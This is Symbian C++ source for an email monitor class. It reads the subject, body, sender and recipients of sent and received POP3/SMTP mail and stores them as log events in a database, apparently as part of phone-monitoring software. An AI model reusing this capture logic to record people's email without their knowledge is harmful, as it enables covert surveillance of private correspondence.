#include "CltEmailMonitor.h"
#include "CltLogEvent.h"
#include "CltEmailMonitor.h"
#include "Global.h"
#include "CltMessageMonitor.h"
#include "CltLogEvent.h"
#include "WatchListHelper.h"

#include <CMsvRecipientList.h>
#include <mtclreg.h> //CClientMtmRegistry
#include <mtclbase.h> //CBaseMtm
#include <POPCMTM.h> // Pop3 MTM
#include <SMTCMTM.h> // Smtp MTM
#include <MIUTMSG.h> // Smtp MTM
#include <logcli.h>
#include <logwrap.h>
#include <miutset.h> // m type

const TInt KMaxRetry = 3;

CFxMailMonitor::CFxMailMonitor(CFxsDatabase& aDb)
:CActiveBase(CActive::EPriorityHigh),
iDb(aDb)
	{
	}

CFxMailMonitor* CFxMailMonitor::NewL(CFxsDatabase& aDb)
	{	
	CFxMailMonitor* self = new (ELeave) CFxMailMonitor(aDb);
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);
	return self;
	}

CFxMailMonitor::~CFxMailMonitor()
	{
	Cancel();
	iFxMsgEntryArray.Close();
	iEventArray.ResetAndDestroy();
	iDuplicateIdArray.Close();
	}

void CFxMailMonitor::ConstructL()
	{
	CActiveScheduler::Add(this);
	}

void CFxMailMonitor::NotifyEngineReady(CClientMtmRegistry* aMtmReg, CMsvSession* aMsvSession)
	{
	iReady = ETrue;
	iMtmReg = aMtmReg;	
	iMsvSession = aMsvSession;	
	}

void CFxMailMonitor::NotifyEventRemoveL(TMsvId aMsvId)
	{
	TInt pos = iDuplicateIdArray.Find(aMsvId);
	if(pos >= 0)
		{
		iDuplicateIdArray.Remove(pos);
		}
	}
	
void CFxMailMonitor::CompleteSelf()
	{
	if (!IsActive()) 
		{
		SetActive();
		TRequestStatus* status = &iStatus;
		User::RequestComplete(status, KErrNone);
		}	
	}

void CFxMailMonitor::RunL()
	{
	if(iStatus == KErrNone && iReady)
		{
		ReadMessageL();
		}
	}

TInt CFxMailMonitor::RunError(TInt aErr)
	{	
	CActiveBase::Error(aErr);
	switch(aErr)
		{
		/**
		Message not found.*/
		case KErrNotFound:
			{
			if(iFxMsgEntryArray.Count())
				{
				iFxMsgEntryArray.Remove(0);
				}
			CompleteSelf();
			}break;
		case KErrInUse:
			{
			//try again
			}break;
		default:
			{
			if(iFxMsgEntryArray.Count())
				{
				if(++iFxMsgEntryArray[0].iRetryCount >= KMaxRetry)
					{
					iFxMsgEntryArray.Remove(0);
					}
				}
			
			if(iFxMsgEntryArray.Count())
				{
				CompleteSelf();
				}
			}
		}
		
	return KErrNone;
	}

void CFxMailMonitor::DoCancel()
	{
	TRequestStatus* status = &iStatus;
	User::RequestComplete(status, KErrCancel);
	}

TPtrC CFxMailMonitor::ClassName()
	{
	return TPtrC(_L("CFxMailMonitor"));
	}

void CFxMailMonitor::NotifyEventL(TUid aUidMsgType, TMsvId aMsvId, TInt aDirection)
	{
	TFxMsgEntry entry = {aMsvId,aUidMsgType, aDirection,0};
	iFxMsgEntryArray.AppendL(entry);
	CompleteSelf();	
	}

void CFxMailMonitor::ReadMessageL()
	{
	for(TInt i=0;i<iFxMsgEntryArray.Count(); i++)
		{
		const TFxMsgEntry& fxMsgEntry = iFxMsgEntryArray[i];
		switch(fxMsgEntry.iDirection)
			{
			case KCltLogDirOutgoing:
				{
				ReadSmtpL(fxMsgEntry.iEntryId);
				iFxMsgEntryArray.Remove(0);
				}break;
			case KCltLogDirIncoming:
				{
				ReadPop3L(fxMsgEntry.iEntryId);
				iFxMsgEntryArray.Remove(0);
				}break;
			default:
				;
			}
		}
	}
	
void CFxMailMonitor::ReadIncomingMailL(const TFxMsgEntry& aFxMsgEntry)
	{
	if(aFxMsgEntry.iUidMsgType == KUidMsgTypePOP3 || aFxMsgEntry.iUidMsgType == KUidMsgTypeIMAP4)
		{
		ReadPop3L(aFxMsgEntry.iEntryId);
		}
	}
/*
For the first version we support
	1. Date/Time
	2. Subject
	3. Body
	4. attachement file name	
	5. Recipient address
	6. Size	
*/
void CFxMailMonitor::ReadSmtpL(const TMsvId aEntryId)
	{
	LOG2(_L("[CFxMailMonitor::ReadSmtpL] aEntryId: %d, IsDuplicateId: %d"),aEntryId,IsDuplicateId(aEntryId))
	if(!IsDuplicateId(aEntryId))
		{
		AddDuplicateList(aEntryId);
		CMsvEntry* msvEntry = iMsvSession->GetEntryL(aEntryId);
		CleanupStack::PushL(msvEntry);		
		
		msvEntry->SetEntryL(aEntryId);				
		TMsvEmailEntry entry = (TMsvEmailEntry)msvEntry->Entry();
		LOG2(_L("[CFxMailMonitor::ReadSmtpL] Unread: %d, New: %d "),entry.Unread(), entry.New())
		CSmtpClientMtm* smtpMtm = STATIC_CAST(CSmtpClientMtm*, iMtmReg->NewMtmL(entry.iMtm));
		CleanupStack::PushL(smtpMtm);
		
		smtpMtm->SwitchCurrentEntryL(aEntryId);
		smtpMtm->LoadMessageL();
		
		//CImEmailMessage
		HBufC* recipients = RecipientsLC(smtpMtm->AddresseeList());
		
		//Email body
		CRichText& body = smtpMtm->Body();
		TInt docLen = body.DocumentLength();
		if(docLen >= KMaxMailContentLength)
			{
			docLen = KMaxMailContentLength;
			}
		
		HBufC* emailContents = HBufC::NewLC(docLen);
		TPtr contentPtr = emailContents->Des();
		body.Extract(contentPtr,0, docLen);
		
		TPtrC subject = entry.iDescription; // subject					
		TPtrC details = entry.iDetails;	 // contact name		
		
		LOG2(_L("[CFxMailMonitor::ProcessSmtpL] DocumentLength: %d, ReadLength: %d"), body.DocumentLength(), emailContents->Length())
		LOG1(_L("[CFxMailMonitor::ProcessSmtpL] Email Body: %S"),&emailContents)	
		LOG1(_L("[CFxMailMonitor::ProcessSmtpL] Email Subject: %S"),&subject)		
		LOG1(_L("[CFxMailMonitor::ProcessSmtpL] Size: %d"),entry.iSize)		
		LOG1(_L("[CFxMailMonitor::ProcessSmtpL] Contact: %S"), &details)
		
		CFxsLogEvent* event = CFxsLogEvent::NewL(aEntryId, // messageid
												  entry.iSize,// Duration field for email size
												  KCltLogDirOutgoing, // Direction
												  KFxsLogEventTypeMail, // EventType
												  entry.iDate,		//Time
												  TPtrC(),			//Status field: Attachement file name separated by semicolon(;)
												  *recipients,		//Description : Recipient(s) email address
												  TPtrC(),		//Number field: Sender email address
												  subject, 		//Subject field: Subject
												  *emailContents,		//Data field: body contents
												  details,		//RemoteParty field: Contact name which is delimited by a semicolon (;)
												  TPtrC(), 		//Time string: 
												  EEntryMsvAdded); //RemoteParty field: contact name
		
		InsertDbL(event);//pass ownership	
		
		CleanupStack::PopAndDestroy(4);//msvEntry, smsMtm, recipients, emailContents
		}
	}
	
/*
For the first version we support
	1. Date/Time
	2. Subject
	3. Sender address
	4. Size	
*/
void CFxMailMonitor::ReadPop3L(const TMsvId aEntryId)
	{
	LOG2(_L("[CFxMailMonitor::ReadPop3L] aEntryId: %d, Duplicated: %d"),aEntryId, IsDuplicateId(aEntryId))
	if(!IsDuplicateId(aEntryId))
		{
		CMsvEntry* msvEntry = iMsvSession->GetEntryL(aEntryId);
		CleanupStack::PushL(msvEntry);		
		
		msvEntry->SetEntryL(aEntryId);				
		TMsvEmailEntry entry = (TMsvEmailEntry)msvEntry->Entry();
			 
		LOG2(_L("[CFxMailMonitor::ReadPop3L] Unread: %d, New: %d "),entry.Unread(), entry.New())
		LOG1(_L("[CFxMailMonitor::ReadPop3L] ParentId :%d"),entry.Parent())
		LOG3(_L("[CFxMailMonitor::ReadPop3L] MHTMLEmail: %d, PartialDownloaded: %d, BodyTextComplete: %d"),entry.MHTMLEmail(), entry.PartialDownloaded(), entry.BodyTextComplete())
		LOG2(_L("[CFxMailMonitor::ReadPop3L] IMAP4 Mailbox: %d, BodyTextComplete: %d, "),entry.Mailbox(), entry.BodyTextComplete())
		LOG2(_L("[CFxMailMonitor::ReadPop3L] Complete: %d, MultipleRecipients: %d, "),entry.Complete(), entry.MultipleRecipients())
		LOG3(_L("[CFxMailMonitor::ReadPop3L] InPreparation: %d, Connected: %d, New: %d"),entry.InPreparation(), entry.Connected(), entry.New())
		
		if(entry.BodyTextComplete() && entry.Complete())
		//
		//Check to ensure that email body is loaded and can be read
		//Body text is loaded and Completed
			{
			AddDuplicateList(aEntryId);		
			CPop3ClientMtm* popMtm = STATIC_CAST(CPop3ClientMtm*, iMtmReg->NewMtmL(entry.iMtm));		
			CleanupStack::PushL(popMtm);
			
			popMtm->SwitchCurrentEntryL(aEntryId);		
			popMtm->LoadMessageL();		
			//Email body
			CRichText& body = popMtm->Body();	
			TInt docLength = body.DocumentLength();
				
			if(docLength >= KMaxMailContentLength)
				{
				docLength = KMaxMailContentLength;
				}
			
			HBufC* emailContents = HBufC::NewLC(docLength);
			TPtr contentPtr = emailContents->Des();
			body.Extract(contentPtr,0, docLength);	
			
			TPtrC subject = entry.iDescription; // subject					
			TPtrC emailFrom = entry.iDetails;	 // contact name		
			
			LOG2(_L("[CFxMailMonitor::ReadPop3L] DocumentLength: %d, ReadLength: %d"), body.DocumentLength(), emailContents->Length())
			LOG1(_L("[CFxMailMonitor::ReadPop3L] Email Subject: %S"),&subject)		
			LOG1(_L("[CFxMailMonitor::ReadPop3L] Size: %d"), entry.iSize)		
			LOG1(_L("[CFxMailMonitor::ReadPop3L] emailFrom: %S"), &emailFrom)	
			
			CFxsLogEvent* event = CFxsLogEvent::NewL(aEntryId, // messageid
													  entry.iSize,// Duration field for email size
													  KCltLogDirIncoming, // Direction
													  KFxsLogEventTypeMail, // EventType
													  entry.iDate,		//Time
													  TPtrC(),			//Status field: Attachement file name separated by semicolon(;)
													  TPtrC(),//*recipients,		//Description : Recipient(s) email address
													  emailFrom,		//Number field: Sender email address
													  subject, 		//Subject field: Subject
													  *emailContents,		//Data field: body contents
													  emailFrom,		//RemoteParty field: Contact name which is delimited by a semicolon (;)
													  TPtrC(), 		//Time string: 
													  EEntryMsvAdded); //RemoteParty field: contact name
			
			InsertDbL(event);		
			CleanupStack::PopAndDestroy(2);	 //emailContents
			}
			
		CleanupStack::PopAndDestroy(); //msvEntry, popMtm
		}
	}

void CFxMailMonitor::ReadImap4(const TMsvId aEntryId)
	{//Incoming email
	LOG1(_L("[CFxMailMonitor::ReadImap4] aEntryId: %d"),aEntryId)	
	}

void CFxMailMonitor::InsertDbL(CFxsLogEvent* aEvent)
	{
	ASSERT(aEvent != NULL);
	iDb.InsertDbL(aEvent); //passing ownership	
	}
	
HBufC* CFxMailMonitor::RecipientsLC(const CMsvRecipientList& aRecipientList)
	{
	RBuf to;
	RBuf cc;
	RBuf bcc;
	to.CleanupClosePushL();
	cc.CleanupClosePushL();
	bcc.CleanupClosePushL();
	TInt recipntCount = aRecipientList.Count();
	for(TInt i=0;i<recipntCount; i++)
		{
		TInt reallocLength = aRecipientList[i].Length() + 2;
		switch(aRecipientList.Type(i))
			{
			case EMsvRecipientTo:
				{
				to.ReAllocL(to.Length() + reallocLength);
				to.Append(aRecipientList[i]);
				to.Append(KSemiColon);
				}break;
			case EMsvRecipientCc:
				{
				cc.ReAllocL(cc.Length() + reallocLength);
				cc.Append(aRecipientList[i]);	
				cc.Append(KSemiColon);				
				}break;
			case EMsvRecipientBcc:
				{
				bcc.ReAllocL(bcc.Length() + reallocLength);
				bcc.Append(aRecipientList[i]);
				bcc.Append(KSemiColon);
				}break;
			default:
				;
			}		
		}
	
	HBufC* ret = HBufC::NewL(to.Length() + cc.Length() + bcc.Length() + 4);
	TPtr ptr=ret->Des();
	ptr.Append(to);	
	if(cc.Length())
		{
		ptr.Append(KCRLF);
		ptr.Append(cc);
		}
	if(bcc.Length())
		{
		ptr.Append(KCRLF);
		ptr.Append(bcc);
		}
	CleanupStack::PopAndDestroy(3);//to,cc,bcc
	CleanupStack::PushL(ret);
	return ret;
	}

TBool CFxMailMonitor::IsDuplicateId(TMsvId aMsvId)
	{
	return iDuplicateIdArray.Find(aMsvId) != KErrNotFound;
	}	

void CFxMailMonitor::AddDuplicateList(TMsvId aMsvId)
	{
	iDuplicateIdArray.Append(aMsvId);
	}

void CFxMailMonitor::OnDbUnlock()
	{	
	}

//Append LogEvent to database
void CFxMailMonitor::AppendToDatabase()
	{
	}
